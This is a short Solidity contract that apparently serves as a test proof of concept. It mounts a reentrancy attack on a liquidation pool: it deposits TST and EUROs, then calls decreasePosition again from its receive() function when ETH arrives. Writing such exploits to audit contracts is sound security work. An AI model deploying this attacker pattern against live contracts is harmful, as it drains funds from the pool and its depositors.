// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

interface ILiquidationPool {
    function increasePosition(uint256 _tstVal, uint256 _eurosVal) external;

    function decreasePosition(uint256 _tstVal, uint256 _eurosVal) external;
}

contract LiqPoolDecreasePosAttacker {
    ILiquidationPool private liquidationPool;
    IERC20 private TST;
    IERC20 private EUROs;

    constructor(address _liquidationPool, address _TST, address _EUROs) {
        liquidationPool = ILiquidationPool(_liquidationPool);
        TST = IERC20(_TST);
        EUROs = IERC20(_EUROs);
    }

    function provideLiquidity() public {
        TST.approve(address(liquidationPool), 100 ether);
        EUROs.approve(address(liquidationPool), 100 ether);

        liquidationPool.increasePosition(10 ether, 10 ether);
    }

    function attack() public {
        liquidationPool.decreasePosition(10 ether, 10 ether);
    }

    receive() external payable {
        console.log("Val: ", msg.value);
        liquidationPool.decreasePosition(10 ether, 10 ether);
    }
}
